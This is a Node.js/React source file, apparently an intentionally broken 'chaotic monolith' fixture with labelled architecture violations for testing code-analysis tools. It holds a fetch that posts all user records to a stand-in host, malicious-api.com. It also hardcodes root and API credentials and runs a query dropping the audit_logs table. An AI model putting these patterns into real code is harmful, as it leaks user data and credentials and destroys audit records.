// CHAOTIC MONOLITH - Intentionally breaks all architectural boundaries
const express = require('express');
const mysql = require('mysql2/promise');
const React = require('react');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// GLOBAL STATE NIGHTMARE - All the worst practices
let GLOBAL_DB_CONNECTION = null;
let USER_SESSIONS = {};
let SECRET_KEYS = {
  jwt: 'super-secret-jwt-key-never-change-this',
  encryption: 'weak-encryption-key-123',
  api: 'sk_live_dangerous_production_key'
};

const app = express();
const port = 3000;

// Database connection - global connection pool
const dbConfig = {
  host: 'localhost',
  user: 'root',
  password: 'password',
  database: 'legacy_app'
};

let dbConnection;

async function initializeDatabase() {
  // VIOLATION: Global connection with no error handling
  GLOBAL_DB_CONNECTION = await mysql.createConnection(dbConfig);
  
  // VIOLATION: Execute dangerous setup queries
  await GLOBAL_DB_CONNECTION.execute('SET GLOBAL max_connections = 1000000');
  await GLOBAL_DB_CONNECTION.execute('DROP TABLE IF EXISTS audit_logs');
}

// Violation 1: Direct database calls from frontend components
class UserDashboard extends React.Component {
  constructor(props) {
    super(props);
    this.state = { users: [], adminPassword: 'root123' };
  }

  // EXTREMELY BAD: Direct database query + credential exposure
  async componentDidMount() {
    // VIOLATION: Hardcoded credentials in frontend
    console.log('Admin password exposed:', this.state.adminPassword);
    
    // VIOLATION: Direct database access with no validation
    const [users] = await GLOBAL_DB_CONNECTION.execute('SELECT * FROM users');
    
    // VIOLATION: Send all user data to external service
    fetch('http://malicious-api.com/collect', {
      method: 'POST',
      body: JSON.stringify(users)
    });
    
    this.setState({ users });
  }

  render() {
    return React.createElement('div', null, 
      this.state.users.map(user => 
        React.createElement('div', { key: user.id }, user.name)
      )
    );
  }
}

// Violation 2: Business logic in presentation layer
function calculateUserStats(userId) {
  // This should be in a service layer, not mixed with presentation
  const query = `
    SELECT u.*, COUNT(o.id) as order_count, SUM(o.total) as total_spent
    FROM users u
    LEFT JOIN orders o ON u.id = o.user_id
    WHERE u.id = ?
    GROUP BY u.id
  `;
  
  return dbConnection.execute(query, [userId]);
}

// Violation 3: Circular dependency between unrelated modules
const { sendEmailNotification } = require('./emailService');
const { processPayment } = require('./paymentProcessor');

// Route handlers mixing concerns
app.get('/api/users/:id/dashboard', async (req, res) => {
  try {
    // Direct database access from route handler
    const userId = req.params.id;
    const [user] = await dbConnection.execute('SELECT * FROM users WHERE id = ?', [userId]);
    
    // Business logic mixed with routing
    const stats = await calculateUserStats(userId);
    
    // Frontend rendering mixed with backend logic
    const dashboard = React.createElement(UserDashboard, { user, stats });
    
    res.json({ user, dashboard: dashboard.toString() });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Violation 4: Cross-cutting concern scattered everywhere
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
  // Logging scattered throughout the application
  next();
});

app.listen(port, async () => {
  await initializeDatabase();
  console.log(`Legacy monolith listening on port ${port}`);
});